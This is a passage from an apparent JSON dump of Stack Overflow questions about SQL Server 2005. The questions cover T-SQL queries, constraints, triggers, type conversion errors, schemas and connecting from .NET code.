database?</p>\n\n<p>Thank you so much for your help.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":456,"score":0,"question_id":10834610,"title":"Date of inserting a row into table ","body":"<p>Is it possible to find date+time when a row was inserted into a table in SQL Server 2005?</p>\n\n<p>Does SQL Server log insert commands?</p>\n"},{"tags":["sql-server","sql-server-2005","named-instance"],"answer_count":7,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":16080,"score":10,"question_id":35026,"title":"SQL Server, convert a named instance to default instance?","body":"<p>I need to convert a named instance of SQL server 2005, to a default instance.</p>\n\n<p>Is there a way to do this without a reinstall?</p>\n\n<hr>\n\n<p>The problem is, 2 out of 6 of the developers, installed with a named instance. So its becoming a pain changing connection strings for the other 4 of us. I am looking for the path of least resistance to getting these 2 back on to our teams standard setup.  </p>\n\n<p>Each has expressed that this is going to be, too much trouble and that it will take away from their development time. I assumed that it would take some time to resolve, in the best interest of all involved, I tried combing through configuration apps installed and didn't see anything, so I figured someone with more knowledge of the inner workings would be here.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13202697,"title":"Updating a set of data from the output of a Table Valued Function","body":"<p>I am trying to write up a query that are merging duplicate client records in to a single record. Right now I am just building a mapping table to know what I should map with what.</p>\n\n<p>Here are the two functions I wrote to aid me in this</p>\n\n<pre><code>CREATE FUNCTION FindDuplicateClients ()\nRETURNS TABLE AS RETURN \n(\n    select distinct CLIENT_GUID \n    from CLIENTS c\n    inner join\n    (\n        select FIRST_NAME, LAST_NAME, HOME_PHONE\n        from CLIENTS\n        group by FIRST_NAME, LAST_NAME, HOME_PHONE\n        having COUNT(*) &gt; 1\n    ) t on c.FIRST_NAME = t.FIRST_NAME and c.LAST_NAME = t.LAST_NAME and c.HOME_PHONE = t.HOME_PHONE)\ngo\n\n--Find other clients that map to this client\nCREATE FUNCTION FindDuplicateClientsByClient (@Client uniqueidentifier)\nRETURNS TABLE AS RETURN \n(\n    select distinct CLIENT_GUID \n    from CLIENTS c\n    inner join\n    (\n        select x.FIRST_NAME, x.LAST_NAME, x.HOME_PHONE\n        from CLIENTS x\n        inner join \n        (\n            select FIRST_NAME, LAST_NAME, HOME_PHONE\n            from CLIENTS\n            where CLIENT_GUID = @Client\n        ) y on x.FIRST_NAME = y.FIRST_NAME and x.LAST_NAME = y.LAST_NAME and x.HOME_PHONE = y.HOME_PHONE\n        group by x.FIRST_NAME, x.LAST_NAME, x.HOME_PHONE\n        having COUNT(*) &gt; 1\n    ) t on c.FIRST_NAME = t.FIRST_NAME and c.LAST_NAME = t.LAST_NAME and c.HOME_PHONE = t.HOME_PHONE\n    where CLIENT_GUID &lt;&gt; @Client)\ngo\n</code></pre>\n\n<p>The first function successfully returns all <code>CLIENT_GUID</code>'s that have more than 1 record, the second you pass in a GUID and it returns all other guids that share the \"Common Information\" (first name, last name, and home phone in this case)</p>\n\n<p>The problem is filling out my mapping table. I have some rules I need to follow to give priority to some of the duplicates. For example anyone who has had transactions needs to not have their <code>CLIENT_GUID</code> changed, but they are able to have other GUIDs merged in to them (if the other GUIDs had no transactions)</p>\n\n<pre><code>--Create Mapping table\nselect CLIENT_GUID, CAST(null as uniqueidentifier) as NEW_CLIENT_GUID\ninto #mapping\nfrom FindDuplicateClients()\n\n--Do not map people who have transactions\nupdate #mapping\nset NEW_CLIENT_GUID = CLIENT_GUID\nwhere CLIENT_GUID in (select CLIENT_GUID from trnHistory)\n</code></pre>\n\n<p>Now here is where I am running in to trouble. I don't know how to get the list of people who had <code>NEW_CLIENT_GUID</code> set in the previous query, run <code>FindDuplicateClientsByClient</code> against that GUID, and set <code>NEW_CLIENT_GUID</code> of any result to the <code>NEW_CLIENT_GUID</code> that was fed in to the function without using a cursor.</p>\n\n<p>Here is the method I came up with using a cursor</p>\n\n<pre><code>declare cur cursor LOCAL FAST_FORWARD for select NEW_CLIENT_GUID from #mapping where NEW_CLIENT_GUID is not null\ndeclare @NEW_CLIENT_GUID uniqueidentifier\n\nopen cur\nfetch next from cur into @NEW_CLIENT_GUID\nwhile @@fetch_status = 0\nbegin\n    update #mapping\n    set NEW_CLIENT_GUID = @NEW_CLIENT_GUID\n    where CLIENT_GUID in (select CLIENT_GUID from FindDuplicateClientsByClient(@NEW_CLIENT_GUID)) --Find duplicates to this record\n        and NEW_CLIENT_GUID is null --Do not reassign values that are already set (ie: duplicates that have transactions)\n\n    fetch next from cur into @NEW_CLIENT_GUID\nend \n\nclose cur\ndeallocate cur\n</code></pre>\n\n<p>To me, iterating over each result in <code>#mapping</code> that has a value set does not seem correct to me. What would be the correct way to do this? I am using SQL Server 2008 R2 but I would prefer if it was compatible with SQL Server 2005 too.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","query-optimization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":79,"score":-1,"question_id":13227560,"title":"SQL Server 2005 query optimization","body":"<p>My application need to get data from a SQL Server database. My problem is that there is 3 tables that has to be joined into a view. This takes a lot of time (about 30 sec to generate the view) So I was wondering if there is a way to optimize this SQL query?</p>\n\n<p>SQL query: </p>\n\n<pre><code>SELECT TOP (100) PERCENT Request1.RequestID,\n                         TrackIT.dbo.Sending.Barcode,\n                         TrackIT.dbo.Address_View.AdrID,\n                         TrackIT.dbo.Address_View.Name,\n                         TrackIT.dbo.Address_View.Street,\n                         TrackIT.dbo.Address_View.HouseNo,\n                         TrackIT.dbo.Address_View.Postal,\n                         TrackIT.dbo.Address_View.City,\n                         TrackIT.dbo.Address_View.Country,\n                         Request1.Latitude,\n                         Request1.Longitude,\n                         Request1.ReceivedDate\nFROM   (SELECT DISTINCT RequestID,\n                        Ltrim([Content]) AS Barcode,\n                        Latitude,\n                        Longitude,\n                        ReceivedDate\n        FROM   RequestWithLocation\n        WHERE  ( Site LIKE '%Z' )\n               AND ( [Content] &lt;&gt; '' )\n               AND ( AddressID = '0' )\n               AND ReceivedDate &gt; Dateadd(day, -7, Getdate())) AS Request1\n       INNER JOIN TrackIT.dbo.Sending\n         ON Request1.Barcode = TrackIT.dbo.Sending.Barcode\n       INNER JOIN TrackIT.dbo.Address_View\n         ON TrackIT.dbo.Sending.DeliveryAdrID = TrackIT.dbo.Address_View.AdrID\nORDER  BY AdrID \n</code></pre>\n\n<p>Can anyone help ?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13230372,"title":"Order By alphanumeric values like numeric","body":"<p>there is a table's fields on MSSQL Serrver 2005 as VARCHAR. It contains alphanumeric values like \"A,B,C,D ... 1,2,3,...,10,11,12\" etc.</p>\n\n<p>When i use below codes;</p>\n\n<pre><code>....   \nORDER BY TableFiledName\n</code></pre>\n\n<p><strong>Ordering result is as follow</strong> 11,12,1,2,3 etc.</p>\n\n<p>When i use codes as below,</p>\n\n<pre><code>....   \n ORDER BY\n    CASE WHEN ISNUMERIC(TableFiledName) = 0 THEN CAST(TableFiledNameAS INT) ELSE TableFiledName END\n</code></pre>\n\n<p>I get error message as below;</p>\n\n<blockquote>\n  <p>Msg 8114, Level 16, State 5, Line 1 Error converting data type varchar\n  to float.</p>\n</blockquote>\n\n<p><strong>How can get like this ordering result:</strong> 1,2,3,4,5,6,7,8,9,10,11,12 etc..</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005","quotes","quotations"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":20217,"score":4,"question_id":775687,"title":"How to insert text with single quotation sql server 2005","body":"<p>I want to insert text with single quote \nEg john's to table  in sql server 2005 database</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":13745,"score":6,"question_id":1586560,"title":"How do I escape a single quote in sqlserver?","body":"<p>I'm trying to insert some text data into a table in SQLServer 9.\nThe text includes a single quote.\nHow do I escape that?\nI tried using two single quotes, but it threw me some errors.\neg. insert into my_table values('hi, my name''s tim.');</p>\n"},{"tags":["sql-server-2005","database-partitioning"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":603,"score":0,"question_id":7263151,"title":"Does partitioning work with SQL Server 2005 Standard edition SP2","body":"<p>I am using SQL Server 2005 Standard edition with SP2 in test environment. My local SQL Server is a Developer edition. </p>\n\n<p>I was able to partition the table on my local computer. I know that the SQL Server Standard edition does not support either indexed views or partitioning. I just wanted to know if the SP2 has made any difference to the Standard edition.</p>\n\n<p>Thanks\nvihar.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13227030,"title":"Finding first matched string in a column in SQL Server","body":"<p>I have a table as follows:</p>\n\n<pre><code>TABLE1\n\nNo  Description\n1   Hello Hai Hello\n2   Good Bad Good\n3   Hello Good Hai\n4   Hai Hello Bad\n5   Hello Hello Hello\n</code></pre>\n\n<p>Now if I run the following query:</p>\n\n<pre><code>Select * \nfrom TABLE1 \nwhere Description like '%Hai%' \n   OR  Description like '%Hello%' \n   OR Description like '%Good%'\n</code></pre>\n\n<p>I want the result as follows ( By adding one extra column \"FIRST MATCHED WORD\"):</p>\n\n<pre><code>No  Description     First Matched Word\n1   Hello Hai Hello     Hai\n2   Good Bad Good       Good\n3   Hello Good Hai      Hai\n4   Hai Hello Bad       Hai\n5   Hello Hello Hello   Hello\n</code></pre>\n\n<p>Hear my intention is to find out the first matched word depends on our query. Kindly help me.</p>\n"},{"tags":[".net","sql","sql-server","sql-server-2005"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":3461,"score":0,"question_id":4941489,"title":"Query vs Stored procedure; difference between two approaches","body":"<p>I am developing a web page for search. I have two options to build this page</p>\n\n<ol>\n<li><p>To build the query on page according to parameter enter by the user and send it to server.</p></li>\n<li><p>To send parameters to stored procedure and build query there and get it executed.</p></li>\n</ol>\n\n<p>I want to know that which approach I should adopt and why. </p>\n\n<p>I want to know the advantages or disadvantages of both approaches. </p>\n"},{"tags":["sql-server-2005","excel","reporting-services","export"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":3288,"score":2,"question_id":393669,"title":"Disabling or overriding the excel and pdf export function in Reporting Services","body":"<p>Is there a way to disable or override the excel and pdf export function in SQL Server Reporting Services. I want to my own custom excel export.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13218482,"title":"Check for SQL Server existence before connection","body":"<p>We need to check for the existence of a SQL server across all domains prior to attempting to connect to the server. We can loop through the list of servers on the local domain use SQLDataSourceEnumerator, but that takes a few seconds to load up and it only gets the local domain. We are using SQL Server 2005 and 2008 servers as well as .Net 2010. We don't want to attempt to connect and wait for the 30 second or more timeout that appears to be standard if the server doesn't exist. </p>\n\n<p>Any suggestions would be helpful.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4719,"score":2,"question_id":4374880,"title":"How to use between operator with case statement in SQL Server 2005","body":"<p>How to use <code>BETWEEN</code> operator with <code>CASE</code> statement</p>\n\n<pre><code>@FromEmpAge\n@ToempAge\n\nselect * from Emp\nwhere EmpAge between\n  case when ToempAge0 then @FromEmpAge and @ToempAge end\n</code></pre>\n\n<p>How to do this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":313,"score":3,"question_id":3872173,"title":"Compare when value could be both NULL or text","body":"<p>Now I know you can't directly compare NULL to anything (as null is unknown) so how would I achieve the following:</p>\n\n<pre><code>select  *\n    from    Material as m\n    where   MtrlCode = 826 and\n            Exposlimit &lt;&gt; 'compareMe'\n</code></pre>\n\n<p>Where Exposlimit MAY be NULL or it may not be.\n'compareMe' may also be NULL.</p>\n\n<p>Therefore how do I compare the two?  Both sides could be either text or NULL.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3823,"score":3,"question_id":3702576,"title":"SQL if no rows are returned do this","body":"<p>I have a select statement and I want to say if this select statement does not return any rows then put a '' in every cell. How do I do this?</p>\n"},{"tags":["c#","asp.net","sql-server-2005","visual-studio-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13208601,"title":"How to insert a row into SQL Server 2005 using c#","body":"<p>I am using VS 2008 and SQL Server 2005. I am using below code to insert a row to a table.</p>\n\n<p>Table is <code>TestTable</code>, and it has a single column <code>Name</code> (<code>varchar(50)</code>).</p>\n\n<p>I am totally new to c# coding, please help me in this.</p>\n\n<pre><code>protected void Button1_Click(object sender, EventArgs e)\n{\n    try\n    {\n        string sql = \"insert into TestTable(Name) values (vinayak)\";\n        using (SqlConnection conn = new SqlConnection(\"Data Source=VINAYAK-PC;Initial Catalog=TestTable;Integrated Security=True;\"))\n        {\n            conn.Open();\n            using (SqlCommand cmd = new SqlCommand(sql, conn))\n            {\n                cmd.Parameters.AddWithValue(\"@Name\", \"test\"); // assign value to parameter \n                cmd.ExecuteNonQuery();\n            }\n        }\n    }\n    catch (SqlException ex)\n    {\n        string msg = \"Insert Error:\";\n        msg += ex.Message;\n    }\n}\n</code></pre>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","gridview"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13207520,"title":"Pagination through Sql query","body":"<p>I am developing an application in which am using grid view. I want to use pagination for that grid view by using sql query.</p>\n\n<p>I want to display records with the help of <code>pagesize</code> and <code>pageindex</code>. </p>\n\n<p>How can I do this with sql query?</p>\n"},{"tags":["sql-server","vb.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13207479,"title":"Auto Suggestion textbox","body":"<p>I want to have a auto suggestion textbox which will show the name of employee after typing a specific letter. The name is present in the employee table in three columns i.e firstname, middlename, lastname.</p>\n\n<p>I have tried a code for this but it can show only one column of the table i.e the firstname.\nHow to concatenate all the three columns so that they are suggested in the textbox.</p>\n\n<p>My code:</p>\n\n<pre><code>Dim strSql As String = \"select P_Firstname, P_MiddleName, P_LastName from Patient_Registration\"\n        Dim dtb As New DataTable\n        Using cnn As New SqlConnection(conn)\n            cnn.Open()\n            Using dad As New SqlDataAdapter(strSql, cnn)\n                dad.Fill(dtb)\n            End Using\n            cnn.Close()\n        End Using\n        txtsearch.AutoCompleteMode = AutoCompleteMode.SuggestAppend\n        txtsearch.AutoCompleteSource = AutoCompleteSource.CustomSource\n        If dtb.Rows.Count &gt; 0 Then\n            Dim i As Integer = 0\n            For i = 0 To (dtb.Rows.Count - 1)\n                txtsearch.AutoCompleteCustomSource.Add(dtb.Rows(i)(\"P_FirstName\"))\n            Next\n        End If\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13206848,"title":"Backup and restore","body":"<p>I have created a software using Visual Studio 2008 and SQL Server 2005. In one of my forms I added two buttons, one for taking a backup and another for restore.</p>\n\n<p>Is it requires any special namespaces?</p>\n"},{"tags":["sql-server-2005","schema","theory"],"answer_count":10,"favorite_count":7,"up_vote_count":46,"down_vote_count":0,"view_count":19508,"score":46,"question_id":529142,"title":"What good are SQL Server schemas?","body":"<p>I'm no beginner to using SQL databases, and in particular SQL Server.  However, I've been primarily a SQL 2000 guy and i've always been confused by schemas in 2005+.  Yes, I know the basic definition of a schema, but what are they really used for in a typical SQL Server deployment?</p>\n\n<p>I've always just used the default schema.  Why would I want to create specialized schemas?  Why would I assign any of the built-in schemas?</p>\n\n<p>EDIT: To clarify, I guess i'm looking for the benefits of schemas.  If you're only going to use it as a security scheme, it seems like database roles already filled that.. er.. um.. role.  And using it a as a namespace sepcifier seems to have been something you could have done with ownership (dbo versus user, etc..).</p>\n\n<p>I guess what i'm getting at is, what do Schemas do that you couldn't do with owners and roles?  What are their specifc benefits?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":120,"score":2,"question_id":11858827,"title":"MS SQL Server 2008 script generation creates invalid scripts when using constraints","body":"<p>On an MS SQL Server 2008 (10.50.2811.0) Developer Edition (64-bit), running under Windows 2008 Server 2008 R2 Standard the script generation from within SQL Server Management Studio creates scripts where the same constraint is dropped multiple times. </p>\n\n<p>A simple example includes two tables, tParent and tChild, where tChild's ParentID references tParent's ID. The script (Database context menu => Tasks => Generate Scripts...) being generated (for DROP AND CREATE) looks like this:</p>\n\n<pre><code>USE [TestDb]\nGO\n/****** Object: ForeignKey [FK_tChild_tParent] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] DROP CONSTRAINT [FK_tChild_tParent]\nGO\n/****** Object: Table [dbo].[tChild] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] DROP CONSTRAINT [FK_tChild_tParent]\nGO\nDROP TABLE [dbo].[tChild]\nGO\n/****** Object: Table [dbo].[tParent] Script Date: 08/08/2012 08:11:52 ******/\nDROP TABLE [dbo].[tParent]\nGO\n/****** Object: Table [dbo].[tParent] Script Date: 08/08/2012 08:11:52 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[tParent](\n[ID] [int] IDENTITY(1,1) NOT NULL,\n[Name] [varchar](50) NOT NULL,\n[Value] [int] NOT NULL,\nCONSTRAINT [PK_tParent] PRIMARY KEY CLUSTERED \n(\n[ID] ASC\n)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object: Table [dbo].[tChild] Script Date: 08/08/2012 08:11:51 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[tChild](\n[ID] [int] IDENTITY(1,1) NOT NULL,\n[ParentID] [int] NOT NULL,\n[Name] [varchar](50) NOT NULL,\n[Value] [int] NOT NULL,\nCONSTRAINT [PK_tChild] PRIMARY KEY CLUSTERED \n(\n[ID] ASC\n)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object: ForeignKey [FK_tChild_tParent] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] WITH CHECK ADD CONSTRAINT [FK_tChild_tParent] FOREIGN KEY([ParentID])\nREFERENCES [dbo].[tParent] ([ID])\nGO\nALTER TABLE [dbo].[tChild] CHECK CONSTRAINT [FK_tChild_tParent]\nGO\n</code></pre>\n\n<p>Why are there two identical lines that both try to drop the FK_tChild_tParent constraint? And why is the comment for both lines different?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":30,"score":3,"question_id":13200609,"title":"How get around the arithmetic overflow error converting expression to data type int?","body":"<p>I have the following query:</p>\n\n<pre><code>-- CTE to remove outliers, e.g. remove the fastest and slowest results\n;WITH MinMaxCTE AS \n(\n  SELECT ServerName, CONVERT(VARCHAR(10), UpdatedOn, 101) AS [Date], Version, \n    MIN(JaguarStartupTime) AS MinStartTime, MAX(JaguarStartupTime) AS MaxStartTime\n  FROM dbo.MachineConfiguration (NOLOCK)\n  WHERE DomainLogin NOT IN (SELECT DomainLogin FROM dbo.SupportGroup)\n  GROUP BY ServerName, CONVERT(VARCHAR(10), UpdatedOn, 101), Version\n)\n\nSELECT  AVG(mc.JaguarStartupTime) AS AverageTime\n    , COUNT(*) AS NumEntries\n    , mc.Version\nFROM    #Eligible mc (NOLOCK)\nJOIN MinMaxCTE cte ON mc.ServerName = cte.ServerName \n  AND CONVERT(VARCHAR(10), mc.UpdatedOn, 101) = cte.[Date] \n  AND mc.Version = cte.Version \n  AND mc.JaguarStartupTime &lt;&gt; cte.MinStartTime \n  AND mc.JaguarStartupTime &lt;&gt; cte.MaxStartTime\nGROUP BY mc.Version\nORDER BY Version DESC, AVG(mc.JaguarStartupTime) ASC\n</code></pre>\n\n<p>The definition of the #Eligible temp table is </p>\n\n<pre><code>create table #Eligible (\n    Version nvarchar(50), JaguarStartupTime int, \n    ServerName nvarchar(50), UpdatedOn datetime )\n</code></pre>\n\n<p>No matter what condition or aggregation I comment out, I always get the following error: <code>Arithmetic overflow error converting expression to data type int</code>.</p>\n\n<p>Where can I go from here?  How do I debug this further?</p>\n\n<p>EDIT: Sample data</p>\n\n<pre><code>Version JaguarStartupTime    ServerName     UpdatedOn\n6.4.6.082      16040         NewOrleansLA   2012-08-08 12:34:12.330\n6.5.1.012      40390         BatonRougeLA   2012-08-08 18:33:17.440\n6.5.1.012      48379         HonoluluHI     2012-08-09 04:42:50.453\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13195785,"title":"Is it possible for triggers not to fire?","body":"<p>On three different tables I have separate <code>INSERT</code>, <code>UPDATE</code> and <code>DELETE</code> triggers.</p>\n\n<p>I know positively that they work as expected (tried adding, deleting, updating and confirmed the changes going to log-table). However, it happens that rows are removed or added, without my log tables having any content.</p>\n\n<p>So my question is: Is it possible for instance to add a record without the enabled INSERT trigger being triggered?</p>\n\n<p>This is on SQL Server 2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13194630,"title":"SQL Server 2005 : conversion failed when converting the varchar value '0.00' to data type int","body":"<p>When adding this line into my query:</p>\n\n<pre><code>convert(varchar(20), convert(varchar(20),\nsum(case when tsr.other like '%aa%' then tsr.block1 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block2 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block3 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block4 else 0 end)) * 450) \n</code></pre>\n\n<p>I get this error message:</p>\n\n<blockquote>\n  <p><em>Conversion failed when converting the varchar value '0.00' to data\n  type int</em></p>\n</blockquote>\n\n<p>Data in block column is days - e.g. <code>10.0</code></p>\n\n<p>Any ideas?</p>\n\n<p>i've got it fixed, it was just changing the 450 to 450.0.</p>\n\n<p>The reason for the varchars is that this is just 1 line from 1 of multiple unioned select statements. </p>\n"},{"tags":["sql-server","sql-server-2005","uniqueidentifier","uuid"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":976,"score":6,"question_id":1930917,"title":"How do I identify a blank uniqueidentifier in SQL Server 2005?","body":"<p>I'm getting a <code>uniqueidentifier</code> into a Stored Procedure that looks like this </p>\n\n<p><code>00000000-0000-0000-0000-000000000000</code>.</p>\n\n<p>This seems like a simple thing, but how can identify that this is a blank <code>uniqueidentifier</code>? </p>\n\n<p>If I get a value like this <code>DDB72E0C-FC43-4C34-A924-741445153021</code> I want to do X</p>\n\n<p>If I get a value like this <code>00000000-0000-0000-0000-000000000000</code> I do Y</p>\n\n<p>Is there a more elegant way then counting up the zeros? </p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13195243,"title":"Count of string match in all columns in SQL Server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7766959/search-count-of-words-within-a-string-using-sql\">Search count of words within a string using SQL</a>  </p>\n</blockquote>\n\n\n\n<p>I have a table TABLE1 as follows</p>\n\n<pre>\nCol1    Col2\n1   Hai Hello Hai\n2   Hello Hai Hai Hai\n3   R R R\n4   R R R\n5   Hello Hello Hello\n</pre>\n\n<p>Now If I am searching for  a workd \"Hai\" I want the result as follows</p>\n\n<pre>\nCol1    Col2            Cout_of_Stirng_Match\n1   Hai Hello Hai       2\n2   Hello Hai Hai Hai   3\n</pre>\n\n<p>Kindly help me.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":13071003,"title":"Strange (Caching?) Issue (Bug?) with T-SQL View","body":"<p><strong>This issue was resolved by scripting the view as a create, dropping the view, and then recreating the view using the script, so obviously nothing was <em>wrong</em> with the view, per se.  However, I am very curious as to what the cause could be...</strong></p>\n\n<p>I have a created like this:</p>\n\n<pre><code>CREATE VIEW [dbo].[Employees_V]\nAS\nSELECT  cast(right(EmployeeNo,4) as int) as EmployeeID\n,*\n,cast(0 as bit) AS [IsTerritoryManager]\n,cast(0 as bit) AS [IsCoordinator]\nFROM    AD.dbo.ADEmployees_V\n</code></pre>\n\n<p>The <code>AD.dbo.ADEmployees_V</code> has a lot of different fields, but the relevant fields are <code>Status</code> and <code>ISStatus</code>, defined in the creation of the view as:</p>\n\n<pre><code>,CASE WHEN c.[Status] = 'Active' THEN 'Active' ELSE 'Terminated' END AS [Status]\n,CASE WHEN c.[Status] = 'Active' OR ad.[AccountStatus] LIKE '%Enabled%' THEN 'Active' ELSE 'Terminated' END AS [ISStatus]\n</code></pre>\n\n<p>Today, I added the <code>ISStatus</code> column to <code>AD.dbo.ADEmployees_V</code> (<code>Status</code> was there previously).</p>\n\n<p>After making that change, I did a:</p>\n\n<pre><code>SELECT * FROM [Employees_V]\n</code></pre>\n\n<p>Surprisingly, this did not return the proper results.  <code>ISStatus</code> did not appear as a column header, and instead of being populated with 0s, <code>IsTerritoryManager</code> was populated with the new <code>ISStatus</code> values!</p>\n\n<p>I am guessing that this is some sort of caching issue, but I would <em>love</em> an explanation of what is going on under the covers.  Thanks!</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13180975,"title":"Prevent injection of html tags in SQL Server database","body":"<p>I have created a web site with asp.net 3.5 and SQL Server 2005 on the back end</p>\n\n<p>We have created admin site for updating data in the database by using secure user account.\nI working for live for some time.</p>\n\n<p>After some times we found that some specific <code>html</code> tags are getting inserted into string fields of the database.</p>\n\n<p>It seems some kind of attack </p>\n\n<p>Can any one suggest me how to prevent from that attack.</p>\n"},{"tags":["vb.net","sql-server-2005","header","infragistics","ultragrid"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3545,"score":1,"question_id":314481,"title":"Display Headers in Infragistics ULTRAGRID when no data in table","body":"<p>I am fetching data in  from an SQL table using a DataSet in VB.Net. When there is data in table, it displays the data properly in the grid, but when there is no data in the table, it only shows the UltraGrid's basic view.</p>\n\n<p>How can I display the column names of the table as headings of the UltraGrid even when there is no data in Table?</p>\n\n<hr>\n\n<p>Thanks for the reply, but I think the problem that JD is having is a bit different from mine - in my application the data got fetched properly from SQL Server. My problem is that when there is no data in the table, I want to display the columns of the table as the headings of the grid with 0 rows. This is not happening.</p>\n\n<p>It just shows a message box saying that no data is found, and the UltraGrid shows as it does by default in the application.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":6,"favorite_count":1,"up_vote_count":25,"down_vote_count":0,"view_count":39087,"score":25,"question_id":482885,"title":"How do I drop a foreign key constraint only if it exists in sql server?","body":"<p>I can drop a table if it exists using the following code but do not know how to do the same with a constraint:</p>\n\n<pre><code>IF EXISTS(SELECT 1 FROM sys.objects WHERE OBJECT_ID = OBJECT_ID(N'TableName') AND type = (N'U')) DROP TABLE TableName\ngo\n</code></pre>\n\n<p>I also add the constraint using this code:</p>\n\n<pre><code>ALTER TABLE [dbo].[TableName] \n  WITH CHECK ADD CONSTRAINT [FK_TableName_TableName2] FOREIGN KEY([FK_Name])\n    REFERENCES [dbo].[TableName2] ([ID])\ngo\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13185517,"title":"logging of emails","body":"<p>Is it possible in sql server, to log the emails in the table sent but not actually sent to the reciepents.</p>\n\n<p>i.e I can see the emails details in the log table but the emails will not be sent.</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","ssis","parameters"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":22822,"score":5,"question_id":745207,"title":"How do you call a Stored Procedure in SSIS?","body":"<p>I am trying to create an SSIS package that queries data from a table, and calls a stored procedure in another database with each row.</p>\n\n<p>In my old DTS package, I was doing this:</p>\n\n<pre><code>EXEC myStoredProcedure ?, ?, ?\n</code></pre>\n\n<p>...and then I mapped the parameters.  However, in SSIS, I can't figure out how to make this work.</p>\n\n<p>I have a Data Flow task, which first runs a query for the data.  It passes the data to an OLE DB Destination.  I set the Data access mode to \"SQL command\", but when I try to put in the SQL above, I get 